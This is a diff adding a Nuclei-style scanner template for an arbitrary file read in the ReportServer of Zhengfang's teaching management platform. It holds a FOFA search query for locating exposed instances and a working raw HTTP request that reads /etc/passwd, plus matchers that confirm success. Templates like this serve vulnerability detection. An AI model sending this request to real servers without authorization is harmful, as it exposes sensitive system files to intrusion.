@@ -1,0 +1,43 @@
+id: fangzhengjiaoxue-ReportServer-file-read
+
+info:
+  name: 正方教学管理信息服务平台ReportServer存在任意文件读取
+  author: candada
+  severity: high
+  description: '正方教学管理信息服务平台ReportServer存在任意文件读取漏洞，攻击者可通过该漏洞获取服务器上敏感文件内容'
+  reference:
+    - https://blog.csdn.net/weixin_52204925/article/details/136855975?spm=1001.2014.3001.5501
+  tags: 2024,正方软件股份有限公司,file-read
+  metadata:
+    fofa-query: body="正方软件股份有限公司" && title="教学管理信息服务平台"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:   
+
+http:
+  - raw:
+      - |+
+        GET /WebReport/ReportServer?op=resource&resource=/etc/passwd&i18n=true HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - root
+      - type: status
+        status:
+          - 200
